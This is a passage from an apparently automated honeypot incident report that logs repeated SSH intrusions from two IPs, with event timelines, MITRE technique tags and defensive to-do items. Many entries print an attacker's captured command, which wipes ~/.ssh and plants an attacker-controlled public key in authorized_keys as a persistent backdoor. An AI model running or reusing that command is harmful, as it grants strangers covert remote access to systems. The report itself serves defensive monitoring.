| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:09:33` | `cowrie.session.connect` |
| `2026-06-04 07:09:33` | `cowrie.client.version` |
| `2026-06-04 07:09:33` | `cowrie.client.kex` |
| `2026-06-04 07:09:33` | `cowrie.login.success` |
| `2026-06-04 07:09:34` | `cowrie.session.params` |
| `2026-06-04 07:09:34` | `cowrie.command.input` |
| `2026-06-04 07:09:34` | `cowrie.command.failed` |
| `2026-06-04 07:09:34` | `cowrie.log.closed` |
| `2026-06-04 07:09:34` | `cowrie.session.params` |
| `2026-06-04 07:09:34` | `cowrie.command.input` |
| `2026-06-04 07:09:34` | `cowrie.session.file_download` |
| `2026-06-04 07:09:34` | `cowrie.log.closed` |
| `2026-06-04 07:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c09e5416efc7

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:09 |
| **Last Seen** | 2026-06-04 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:09:36` | `cowrie.session.connect` |
| `2026-06-04 07:09:36` | `cowrie.client.version` |
| `2026-06-04 07:09:36` | `cowrie.client.kex` |
| `2026-06-04 07:09:37` | `cowrie.login.success` |
| `2026-06-04 07:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d70486109538

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:09 |
| **Last Seen** | 2026-06-04 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:09:43` | `cowrie.session.connect` |
| `2026-06-04 07:09:43` | `cowrie.client.version` |
| `2026-06-04 07:09:44` | `cowrie.client.kex` |
| `2026-06-04 07:09:44` | `cowrie.login.success` |
| `2026-06-04 07:09:44` | `cowrie.session.params` |
| `2026-06-04 07:09:44` | `cowrie.command.input` |
| `2026-06-04 07:09:44` | `cowrie.command.failed` |
| `2026-06-04 07:09:45` | `cowrie.log.closed` |
| `2026-06-04 07:09:45` | `cowrie.session.params` |
| `2026-06-04 07:09:45` | `cowrie.command.input` |
| `2026-06-04 07:09:45` | `cowrie.session.file_download` |
| `2026-06-04 07:09:45` | `cowrie.log.closed` |
| `2026-06-04 07:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adaf837f761b

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:09 |
| **Last Seen** | 2026-06-04 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:09:47` | `cowrie.session.connect` |
| `2026-06-04 07:09:47` | `cowrie.client.version` |
| `2026-06-04 07:09:47` | `cowrie.client.kex` |
| `2026-06-04 07:09:48` | `cowrie.login.success` |
| `2026-06-04 07:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-245f31d683ee

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:11 |
| **Last Seen** | 2026-06-04 07:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:11:32` | `cowrie.session.connect` |
| `2026-06-04 07:11:32` | `cowrie.client.version` |
| `2026-06-04 07:11:32` | `cowrie.client.kex` |
| `2026-06-04 07:11:33` | `cowrie.login.success` |
| `2026-06-04 07:11:33` | `cowrie.session.params` |
| `2026-06-04 07:11:33` | `cowrie.command.input` |
| `2026-06-04 07:11:33` | `cowrie.command.failed` |
| `2026-06-04 07:11:34` | `cowrie.log.closed` |
| `2026-06-04 07:11:34` | `cowrie.session.params` |
| `2026-06-04 07:11:34` | `cowrie.command.input` |
| `2026-06-04 07:11:34` | `cowrie.session.file_download` |
| `2026-06-04 07:11:34` | `cowrie.log.closed` |
| `2026-06-04 07:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca12f175f18b

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:11 |
| **Last Seen** | 2026-06-04 07:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:11:36` | `cowrie.session.connect` |
| `2026-06-04 07:11:36` | `cowrie.client.version` |
| `2026-06-04 07:11:36` | `cowrie.client.kex` |
| `2026-06-04 07:11:37` | `cowrie.login.success` |
| `2026-06-04 07:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e83ec2af47a

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:13 |
| **Last Seen** | 2026-06-04 07:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:13:35` | `cowrie.session.connect` |
| `2026-06-04 07:13:35` | `cowrie.client.version` |
| `2026-06-04 07:13:36` | `cowrie.client.kex` |
| `2026-06-04 07:13:36` | `cowrie.login.success` |
| `2026-06-04 07:13:37` | `cowrie.session.params` |
| `2026-06-04 07:13:37` | `cowrie.command.input` |
| `2026-06-04 07:13:37` | `cowrie.command.failed` |
| `2026-06-04 07:13:37` | `cowrie.log.closed` |
| `2026-06-04 07:13:37` | `cowrie.session.params` |
| `2026-06-04 07:13:37` | `cowrie.command.input` |
| `2026-06-04 07:13:37` | `cowrie.session.file_download` |
| `2026-06-04 07:13:37` | `cowrie.log.closed` |
| `2026-06-04 07:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-717f3031a04c

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:13 |
| **Last Seen** | 2026-06-04 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:13:39` | `cowrie.session.connect` |
| `2026-06-04 07:13:39` | `cowrie.client.version` |
| `2026-06-04 07:13:39` | `cowrie.client.kex` |
| `2026-06-04 07:13:40` | `cowrie.login.success` |
| `2026-06-04 07:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f248313d2d0

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:15 |
| **Last Seen** | 2026-06-04 07:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:15:27` | `cowrie.session.connect` |
| `2026-06-04 07:15:27` | `cowrie.client.version` |
| `2026-06-04 07:15:27` | `cowrie.client.kex` |
| `2026-06-04 07:15:28` | `cowrie.login.success` |
| `2026-06-04 07:15:28` | `cowrie.session.params` |
| `2026-06-04 07:15:28` | `cowrie.command.input` |
| `2026-06-04 07:15:28` | `cowrie.command.failed` |
| `2026-06-04 07:15:28` | `cowrie.log.closed` |
| `2026-06-04 07:15:29` | `cowrie.session.params` |
| `2026-06-04 07:15:29` | `cowrie.command.input` |
| `2026-06-04 07:15:29` | `cowrie.session.file_download` |
| `2026-06-04 07:15:29` | `cowrie.log.closed` |
| `2026-06-04 07:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b491063214e5

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:15 |
| **Last Seen** | 2026-06-04 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:15:31` | `cowrie.session.connect` |
| `2026-06-04 07:15:31` | `cowrie.client.version` |
| `2026-06-04 07:15:31` | `cowrie.client.kex` |
| `2026-06-04 07:15:31` | `cowrie.login.success` |
| `2026-06-04 07:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9526ab4e4788

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:19 |
| **Last Seen** | 2026-06-04 07:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:19:15` | `cowrie.session.connect` |
| `2026-06-04 07:19:15` | `cowrie.client.version` |
| `2026-06-04 07:19:16` | `cowrie.client.kex` |
| `2026-06-04 07:19:16` | `cowrie.login.success` |
| `2026-06-04 07:19:16` | `cowrie.session.params` |
| `2026-06-04 07:19:16` | `cowrie.command.input` |
| `2026-06-04 07:19:16` | `cowrie.command.failed` |
| `2026-06-04 07:19:17` | `cowrie.log.closed` |
| `2026-06-04 07:19:17` | `cowrie.session.params` |
| `2026-06-04 07:19:17` | `cowrie.command.input` |
| `2026-06-04 07:19:17` | `cowrie.session.file_download` |
| `2026-06-04 07:19:17` | `cowrie.log.closed` |
| `2026-06-04 07:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10336672e3e

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:19 |
| **Last Seen** | 2026-06-04 07:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:19:19` | `cowrie.session.connect` |
| `2026-06-04 07:19:19` | `cowrie.client.version` |
| `2026-06-04 07:19:19` | `cowrie.client.kex` |
| `2026-06-04 07:19:20` | `cowrie.login.success` |
| `2026-06-04 07:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d7d29133862

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:19 |
| **Last Seen** | 2026-06-04 07:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:19:30` | `cowrie.session.connect` |
| `2026-06-04 07:19:30` | `cowrie.client.version` |
| `2026-06-04 07:19:31` | `cowrie.client.kex` |
| `2026-06-04 07:19:31` | `cowrie.login.success` |
| `2026-06-04 07:19:31` | `cowrie.session.params` |
| `2026-06-04 07:19:31` | `cowrie.command.input` |
| `2026-06-04 07:19:31` | `cowrie.command.failed` |
| `2026-06-04 07:19:32` | `cowrie.log.closed` |
| `2026-06-04 07:19:32` | `cowrie.session.params` |
| `2026-06-04 07:19:32` | `cowrie.command.input` |
| `2026-06-04 07:19:32` | `cowrie.session.file_download` |
| `2026-06-04 07:19:32` | `cowrie.log.closed` |
| `2026-06-04 07:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496d963ec528

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-04 07:19 |
| **Last Seen** | 2026-06-04 07:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:19:34` | `cowrie.session.connect` |
| `2026-06-04 07:19:34` | `cowrie.client.version` |
| `2026-06-04 07:19:34` | `cowrie.client.kex` |
| `2026-06-04 07:19:35` | `cowrie.login.success` |
| `2026-06-04 07:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a0317a97c52

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:21 |
| **Last Seen** | 2026-06-04 07:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:21:15` | `cowrie.session.connect` |
| `2026-06-04 07:21:15` | `cowrie.client.version` |
| `2026-06-04 07:21:16` | `cowrie.client.kex` |
| `2026-06-04 07:21:16` | `cowrie.login.success` |
| `2026-06-04 07:21:16` | `cowrie.session.params` |
| `2026-06-04 07:21:16` | `cowrie.command.input` |
| `2026-06-04 07:21:16` | `cowrie.command.failed` |
| `2026-06-04 07:21:17` | `cowrie.log.closed` |
| `2026-06-04 07:21:17` | `cowrie.session.params` |
| `2026-06-04 07:21:17` | `cowrie.command.input` |
| `2026-06-04 07:21:17` | `cowrie.session.file_download` |
| `2026-06-04 07:21:17` | `cowrie.log.closed` |
| `2026-06-04 07:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3fcc39cc815

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:21 |
| **Last Seen** | 2026-06-04 07:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:21:19` | `cowrie.session.connect` |
| `2026-06-04 07:21:19` | `cowrie.client.version` |
| `2026-06-04 07:21:19` | `cowrie.client.kex` |
| `2026-06-04 07:21:20` | `cowrie.login.success` |
| `2026-06-04 07:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.238.106[.]229` to AbuseIPDB if not already reported
- [ ] Block `1.238.106[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b4c489bc06

| Field | Detail |
|---|---|
| **Source IP** | `1.238.106[.]229` |
| **First Seen** | 2026-06-04 07:25 |
| **Last Seen** | 2026-06-04 07:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 07:25:07` | `cowrie.session.connect` |
| `2026-06-04 07:25:07` | `cowrie.client.version` |
| `2026-06-04 07:25:07` | `cowrie.client.kex` |
| `2026-06-04 07:25:08` | `cowrie.login.success` |
| `2026-06-04 07:25:08` | `cowrie.session.params` |
| `2026-06-04 07:25:08` | `cowrie.command.input` |
